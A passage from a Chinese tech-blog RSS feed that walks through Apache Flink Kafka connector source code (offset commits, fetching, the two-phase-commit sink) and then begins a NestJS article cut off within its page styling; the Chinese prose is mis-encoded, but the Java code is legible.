<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyCheckpointComplete</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> Exception {
    LOG.debug(<span class="hljs-string">"Committing offsets for checkpoint {}"</span>, checkpointId);
    ...

    ((KafkaSourceFetcherManager) splitFetcherManager)
            .commitOffsets(
                    committedPartitions,
                    (ignored, e) -&gt; {...});
}
</code></pre>
<p>KafkaSourceFetcherManager è´Ÿè´£ç®¡ç† fetcher çº¿ç¨‹ï¼Œæäº¤ Offsetã€‚</p>
<p>KafkaPartitionSplitReader çš„ fetch æ–¹æ³•ç”¨æ¥æ¶ˆè´¹ Kafka çš„æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> RecordsWithSplitIds&lt;ConsumerRecord&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt;&gt; fetch() <span class="hljs-keyword">throws</span> IOException {
    ConsumerRecords&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; consumerRecords;
    <span class="hljs-keyword">try</span> {
        consumerRecords = consumer.poll(Duration.ofMillis(POLL_TIMEOUT));
    } <span class="hljs-keyword">catch</span> (WakeupException | IllegalStateException e) {
        <span class="hljs-comment">// IllegalStateException will be thrown if the consumer is not assigned any partitions.</span>
        <span class="hljs-comment">// This happens if all assigned partitions are invalid or empty (starting offset &gt;=</span>
        <span class="hljs-comment">// stopping offset). We just mark empty partitions as finished and return an empty</span>
        <span class="hljs-comment">// record container, and this consumer will be closed by SplitFetcherManager.</span>
        <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(
                        ConsumerRecords.empty(), kafkaSourceReaderMetrics);
        markEmptySplitsAsFinished(recordsBySplits);
        <span class="hljs-keyword">return</span> recordsBySplits;
    }
    <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(consumerRecords, kafkaSourceReaderMetrics);
    List&lt;TopicPartition&gt; finishedPartitions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (TopicPartition tp : consumer.assignment()) {
        <span class="hljs-type">long</span> <span class="hljs-variable">stoppingOffset</span> <span class="hljs-operator">=</span> getStoppingOffset(tp);
        <span class="hljs-type">long</span> <span class="hljs-variable">consumerPosition</span> <span class="hljs-operator">=</span> getConsumerPosition(tp, <span class="hljs-string">"retrieving consumer position"</span>);
        <span class="hljs-comment">// Stop fetching when the consumer's position reaches the stoppingOffset.</span>
        <span class="hljs-comment">// Control messages may follow the last record; therefore, using the last record's</span>
        <span class="hljs-comment">// offset as a stopping condition could result in indefinite blocking.</span>
        <span class="hljs-keyword">if</span> (consumerPosition &gt;= stoppingOffset) {
            LOG.debug(
                    <span class="hljs-string">"Position of {}: {}, has reached stopping offset: {}"</span>,
                    tp,
                    consumerPosition,
                    stoppingOffset);
            recordsBySplits.setPartitionStoppingOffset(tp, stoppingOffset);
            finishSplitAtRecord(
                    tp, stoppingOffset, consumerPosition, finishedPartitions, recordsBySplits);
        }
    }

    <span class="hljs-comment">// Only track non-empty partition's record lag if it never appears before</span>
    consumerRecords
            .partitions()
            .forEach(
                    trackTp -&gt; {
                        kafkaSourceReaderMetrics.maybeAddRecordsLagMetric(consumer, trackTp);
                    });

    markEmptySplitsAsFinished(recordsBySplits);

    <span class="hljs-comment">// Unassign the partitions that has finished.</span>
    <span class="hljs-keyword">if</span> (!finishedPartitions.isEmpty()) {
        finishedPartitions.forEach(kafkaSourceReaderMetrics::removeRecordsLagMetric);
        unassignPartitions(finishedPartitions);
    }

    <span class="hljs-comment">// Update numBytesIn</span>
    kafkaSourceReaderMetrics.updateNumBytesInCounter();

    <span class="hljs-keyword">return</span> recordsBySplits;
}
</code></pre>
<p>è‡³æ­¤ï¼ŒSource ç«¯ç›¸å…³çš„æºç æˆ‘ä»¬å°±æ¢³ç†å®Œäº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å†çœ‹ Sink ç«¯çš„ä»£ç ã€‚</p>
<h4 data-id="heading-8">Sink ç«¯</h4>
<p>æˆ‘ä»¬ä»å·¥å‚ç±»ä¸­çš„ createDynamicTableSink æ–¹æ³•å¼€å§‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSink <span class="hljs-title function_">createDynamicTableSink</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span>
            FactoryUtil.createTableFactoryHelper(
                    <span class="hljs-built_in">this</span>, autoCompleteSchemaRegistrySubject(context));

    <span class="hljs-keyword">final</span> Optional&lt;EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt;&gt; keyEncodingFormat =
            getKeyEncodingFormat(helper);

    <span class="hljs-keyword">final</span> EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt; valueEncodingFormat =
            getValueEncodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    <span class="hljs-keyword">final</span> <span class="hljs-type">DeliveryGuarantee</span> <span class="hljs-variable">deliveryGuarantee</span> <span class="hljs-operator">=</span> validateDeprecatedSemantic(tableOptions);
    validateTableSinkOptions(tableOptions);

    KafkaConnectorOptionsUtil.validateDeliveryGuarantee(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueEncodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SINK_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSink(
            physicalDataType,
            keyEncodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueEncodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            getKafkaProperties(context.getCatalogTable().getOptions()),
            getFlinkKafkaPartitioner(tableOptions, context.getClassLoader()).orElse(<span class="hljs-literal">null</span>),
            deliveryGuarantee,
            parallelism,
            tableOptions.get(TRANSACTIONAL_ID_PREFIX),
            tableOptions.get(TRANSACTION_NAMING_STRATEGY));
}
</code></pre>
<p>å’Œ Source çš„æµç¨‹å¾ˆç›¸ä¼¼ï¼Œè¿™é‡Œé¦–å…ˆæ˜¯è·å– key å’Œ value çš„ç¼–ç æ ¼å¼ï¼Œç„¶ååšäº†å¾ˆå¤šæ ¡éªŒï¼Œæœ€åæ˜¯åˆ›å»º KafkaDynamicSink å®ä¾‹ã€‚</p>
<p>è·å–ç¼–ç æ ¼å¼ç”¨åˆ°çš„å·¥å‚ç±»æ˜¯ SerializationFormatFactoryï¼Œæˆ‘ä»¬å‰é¢ä»‹ç»çš„ JsonFormatFactory ä¹Ÿå®ç°äº† SerializationFormatFactoryï¼Œå› æ­¤å®ƒæ—¢æä¾›äº†è§£ç æ ¼å¼ï¼Œåˆæä¾›äº†ç¼–ç æ ¼å¼ã€‚ç¼–ç æ ¼å¼ç”¨åˆ°çš„ç¼–ç å™¨æ˜¯ JsonRowDataSerializationSchemaï¼Œé€šè¿‡ RowDataToJsonConverters å°† RowData è½¬æ¢æˆ JsonNodeã€‚</p>
<p>åœ¨ KafkaDynamicSink çš„ getSinkRuntimeProvider æ–¹æ³•ä¸­ï¼Œä¸»è¦å°±æ˜¯åˆ›å»º KafkaSink å®ä¾‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/854b4c2fdee4487994510627457e8c5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=WYK4ar2fAKGW1M8Hpkh%2BmUxLcB4%3D" alt="KafkaSink" loading="lazy"/></p>
<p>KafkaSink ç±»å®ç°äº† TwoPhaseCommittingStatefulSink æ¥å£ï¼Œå³æ”¯æŒä¸¤é˜¶æ®µæäº¤ã€‚å®ƒåˆ›å»ºäº† KafkaWrter å’Œ KafkaCommiterã€‚</p>
<p>åˆ›å»º KafkaWriter æ—¶ï¼Œå¦‚æœé…ç½®çš„æ˜¯ ExactlyOnce æ¨¡å¼ï¼Œåˆ™ä¼šåˆ›å»ºå‡º ExactlyOnceKafkaWriterï¼Œå¦åˆ™åˆ›å»º KafkaWriterã€‚Writer çœŸæ­£å®ç°ä¸¤é˜¶æ®µæäº¤çš„æ˜¯ ExactlyOnceKafkaWriterã€‚å®ƒåœ¨å¯åŠ¨æ—¶ï¼Œä¼šè°ƒç”¨ <code>producer.beginTransaction</code> å¼€å¯ä¸€ä¸ªäº‹åŠ¡ã€‚æ•°æ®å†™å…¥æ—¶ä¼šè°ƒç”¨ <code>KafkaWriter.write</code> æ–¹æ³•ï¼Œæ­¤æ“ä½œä¼šè¢«æ ‡è®°ä¸ºäº‹åŠ¡å†…çš„æ“ä½œã€‚å½“ Sink æ”¶åˆ° Barrier æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ flush æ–¹æ³•ï¼Œå°†ç¼“å†²åŒºçš„æ•°æ®éƒ½å‘é€åˆ° Kafka Brokerï¼Œç„¶åè°ƒç”¨ prepareCommit æ–¹æ³•é¢„æäº¤ã€‚é¢„æäº¤æ–¹æ³•ä¸­è®°å½• epoch å’Œ transactionalId è¿”å›ç»™æ¡†æ¶å±‚ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Collection&lt;KafkaCommittable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// only return a KafkaCommittable if the current transaction has been written some data</span>
    <span class="hljs-keyword">if</span> (currentProducer.hasRecordsInTransaction()) {
        <span class="hljs-type">KafkaCommittable</span> <span class="hljs-variable">committable</span> <span class="hljs-operator">=</span> KafkaCommittable.of(currentProducer);
        LOG.debug(<span class="hljs-string">"Prepare {}."</span>, committable);
        currentProducer.precommitTransaction();
        <span class="hljs-keyword">return</span> Collections.singletonList(committable);
    }

    <span class="hljs-comment">// otherwise, we recycle the producer (the pool will reset the transaction state)</span>
    producerPool.recycle(currentProducer);
    <span class="hljs-keyword">return</span> Collections.emptyList();
}
</code></pre>
<p>çŠ¶æ€ä¿å­˜æ—¶ï¼Œä¼šå°†é¢„æäº¤çš„ transactionalId å­˜åˆ°çŠ¶æ€ä¸­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// recycle committed producers</span>
    TransactionFinished finishedTransaction;
    <span class="hljs-keyword">while</span> ((finishedTransaction = backchannel.poll()) != <span class="hljs-literal">null</span>) {
        producerPool.recycleByTransactionId(
                finishedTransaction.getTransactionId(), finishedTransaction.isSuccess());
    }
    <span class="hljs-comment">// persist the ongoing transactions into the state; these will not be aborted on restart</span>
    Collection&lt;CheckpointTransaction&gt; ongoingTransactions =
            producerPool.getOngoingTransactions();
    currentProducer = startTransaction(checkpointId + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> createSnapshots(ongoingTransactions);
}

<span class="hljs-keyword">private</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">createSnapshots</span><span class="hljs-params">(
        Collection&lt;CheckpointTransaction&gt; ongoingTransactions)</span> {
    List&lt;KafkaWriterState&gt; states = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span>[] subtaskIds = <span class="hljs-built_in">this</span>.ownedSubtaskIds;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; index &lt; subtaskIds.length; index++) {
        <span class="hljs-type">int</span> <span class="hljs-variable">ownedSubtask</span> <span class="hljs-operator">=</span> subtaskIds[index];
        states.add(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaWriterState</span>(
                        transactionalIdPrefix,
                        ownedSubtask,
                        totalNumberOfOwnedSubtasks,
                        transactionNamingStrategy.getOwnership(),
                        <span class="hljs-comment">// new transactions are only created with the first owned subtask id</span>
                        index == <span class="hljs-number">0</span> ? ongoingTransactions : List.of()));
    }
    LOG.debug(<span class="hljs-string">"Snapshotting state {}"</span>, states);
    <span class="hljs-keyword">return</span> states;
}
</code></pre>
<p>å½“ Checkpoint å®Œæˆæ—¶ï¼Œä¼šè°ƒç”¨ <code>KafkaCommitter.commit</code> æ–¹æ³•ã€‚åœ¨ commit æ–¹æ³•ä¸­ä¼šè°ƒç”¨ <code>producer.commitTransaction</code> æ­£å¼æäº¤äº‹åŠ¡ã€‚</p>
<p>FlinkKafkaInternalProducer æ˜¯ Flink å†…éƒ¨å°è£…çš„ä¸ Kafka ç”Ÿäº§è€…çš„äº¤äº’ç±»ï¼Œæ‰€æœ‰ä¸ Kafka ç”Ÿäº§è€…çš„äº¤äº’éƒ½é€šè¿‡å®ƒæ‰§è¡Œã€‚</p>
<p>å…³äº Kafka Connector çš„ Sink ç«¯çš„æºç æˆ‘ä»¬å°±æ¢³ç†åˆ°è¿™é‡Œã€‚</p>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>æœ€åè¿˜æ˜¯æ€»ç»“ä¸€ä¸‹ã€‚æœ¬æ–‡æˆ‘ä»¬å…ˆäº†è§£äº† Flink ä¸­è‡ªå®šä¹‰ Source å’Œ Sink çš„æµç¨‹ã€‚æŒ‰ç…§è¿™ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬æ¢³ç†äº† Kafka Connector çš„æºç ã€‚åœ¨ Source ç«¯ï¼ŒFlink Kafka å°è£…äº†å¯¹æ¶ˆè´¹è€… Offset çš„æäº¤é€»è¾‘ã€‚åœ¨ Sink ç«¯ç»“åˆäº† Kafka æä¾›çš„äº‹åŠ¡æ”¯æŒå®ç°äº†ä¸¤é˜¶æ®µæäº¤çš„é€»è¾‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´ï¼Œå€¼å¾—å‰ç«¯å…¨æ ˆå°è¯•çš„ NestJS æŠ€æœ¯æ ˆç»„åˆ ğŸ˜ğŸ˜ğŸ˜]]></title>    <link>https://juejin.cn/post/7597278451029639178</link>    <guid>https://juejin.cn/post/7597278451029639178</guid>    <pubDate>2026-01-20T14:08:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029639178" data-draft-id="7597251197426368538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 2026 å¹´ï¼Œå€¼å¾—å‰ç«¯å…¨æ ˆå°è¯•çš„ NestJS æŠ€æœ¯æ ˆç»„åˆ ğŸ˜ğŸ˜ğŸ˜"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T14:08:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             2026 å¹´ï¼Œå€¼å¾—å‰ç«¯å…¨æ ˆå°è¯•çš„ NestJS æŠ€æœ¯æ ˆç»„åˆ ğŸ˜ğŸ˜ğŸ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:08:27.000Z" title="Tue Jan 20 2026 14:08:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body 